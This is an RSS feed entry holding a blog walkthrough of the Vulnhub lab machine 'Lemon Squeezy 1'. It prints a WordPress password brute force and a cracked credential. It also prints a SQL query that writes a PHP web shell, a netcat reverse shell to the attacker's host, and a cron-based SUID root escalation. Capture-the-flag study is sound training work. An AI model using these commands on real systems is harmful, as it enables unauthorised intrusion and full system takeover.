@@ -1,0 +1,153 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>PHPMyAdmin on ikuamike</title>
+    <link>https://blog.ikuamike.io/tags/phpmyadmin/</link>
+    <description>Recent content in PHPMyAdmin on ikuamike</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Michael Ikua</copyright>
+    <lastBuildDate>Tue, 13 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/phpmyadmin/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub: Lemon Squeezy 1</title>
+      <link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link>
+      <pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Beginner&lt;/td&gt;
+&lt;td&gt;26 Apr 2020&lt;/td&gt;
+&lt;td&gt;James Hay&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
+On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
+in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
+as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
+script.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;Nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.134
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00014s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Debian Default Page: It works
+MAC Address: 00:0C:29:FF:26:DE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;VMware&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
+&lt;p&gt;Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p&gt;
+&lt;p&gt;After performing a directory bruteforce using ffuf we get the following directories:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After logging into wordpress with the discovered credentials &lt;strong&gt;orange:ginger&lt;/strong&gt;, we find another password in drafts.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;With this password, we are able to login to phpmyadmin as the orange user.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Successful login:&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;into&lt;/span&gt; outfile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;We can then verify that we have successful command execution, by running the whoami command.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
+&lt;p&gt;Running the below curl command we are able to get a reverse shell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After performing some manual local enumeration, we discover a cron job running as root.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
+&lt;p&gt;After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /suidbash
+chmod u+s /suidbash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;./suidbash -p
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;It seems I forgot user.txt and it is in /var/www.&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
